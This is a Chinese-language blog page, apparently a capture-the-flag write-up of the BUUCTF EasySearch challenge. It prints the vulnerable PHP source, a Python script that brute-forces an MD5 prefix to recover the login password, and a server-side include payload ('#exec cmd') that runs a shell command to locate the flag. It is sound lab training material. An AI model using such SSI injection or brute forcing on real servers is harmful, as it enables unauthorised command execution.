@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="利用点ssi注入 文件泄露dirsearch  ssi注入服务器端包含注入SSI分析总结 类似于模板注入   审计12345678910111213141516171819202122232425262728293031323334353637&lt;?php	ob_start();	function get_hash()&amp;#123;		$chars &#x3D; &amp;#x27;ABCDEFGHIJKLMNO">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入">
+<meta property="og:url" content="http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="利用点ssi注入 文件泄露dirsearch  ssi注入服务器端包含注入SSI分析总结 类似于模板注入   审计12345678910111213141516171819202122232425262728293031323334353637&lt;?php	ob_start();	function get_hash()&amp;#123;		$chars &#x3D; &amp;#x27;ABCDEFGHIJKLMNO">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-25T09:20:47.000Z">
+<meta property="article:modified_time" content="2022-04-25T09:37:00.501Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/25/BUUCTF-WEB-0CTF-2016-piapiapia-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87preg-match-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&text=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&title=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&is_video=false&description=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入&body=Check out this article: http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&title=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&title=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&title=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&title=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&name=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&t=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%82%B9ssi%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">利用点ssi注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0"><span class="toc-number">3.</span> <span class="toc-text">构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/" class="leancloud-visitors" data-flag-title="BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-25T09:20:47.000Z" itemprop="datePublished">2022-04-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="利用点ssi注入"><a href="#利用点ssi注入" class="headerlink" title="利用点ssi注入"></a>利用点ssi注入</h2><ol>
+<li><p>文件泄露<br>dirsearch</p>
+</li>
+<li><p>ssi注入<br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/66934.html">服务器端包含注入SSI分析总结</a></p>
+<p>类似于模板注入</p>
+</li>
+</ol>
+<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">		<span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;<span class="comment">//$admin 为固定值</span></span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;<span class="comment">//读取hash的前6位，可以用爆破</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>爆破password</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000000</span>):</span><br><span class="line">    a = hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> a[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i,a) </span><br><span class="line"></span><br><span class="line">得到</span><br><span class="line"><span class="number">2020666</span></span><br><span class="line">6d0bc1153791aa2b4e18b4f344f26ab4</span><br><span class="line"><span class="number">2305004</span></span><br><span class="line">6d0bc1ec71a9b814677b85e3ac9c3d40</span><br></pre></td></tr></table></figure>
+
+<h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">post</span><br><span class="line">username=admin&amp;password=<span class="number">2020666</span></span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">Url_is_here: public/1505316955027d7b44433dfc413aeeda5bf434ef.shtm</span><br><span class="line"></span><br><span class="line">再放问Url_is_here</span><br><span class="line"></span><br><span class="line">得到</span><br><span class="line"></span><br><span class="line">Hello,admin<span class="comment">#所以直接在username处插入shell</span></span><br><span class="line"></span><br><span class="line">data: Monday, <span class="number">25</span>-Apr-<span class="number">2022</span> 09:<span class="number">31</span>:<span class="number">19</span> UTC</span><br><span class="line"></span><br><span class="line">Client IP: <span class="number">10.244</span><span class="number">.80</span><span class="number">.46</span><span class="comment">#这里可能也可以，可以用X-Forwarded-For试一下</span></span><br></pre></td></tr></table></figure>
+<p>因为flag不在根目录，所以查找</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--<span class="comment">#exec cmd=&quot;find / -name flag*&quot;--&gt;&amp;password=2020666</span></span><br></pre></td></tr></table></figure>
+<p>得到flag，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/flag_990c66bf85a09c664f0b6741840499b2</span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/66934.html">服务器端包含注入SSI分析总结</a></p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%82%B9ssi%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">利用点ssi注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0"><span class="toc-number">3.</span> <span class="toc-text">构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&text=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&title=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&is_video=false&description=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入&body=Check out this article: http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&title=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&title=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&title=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&title=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&name=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/&t=BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
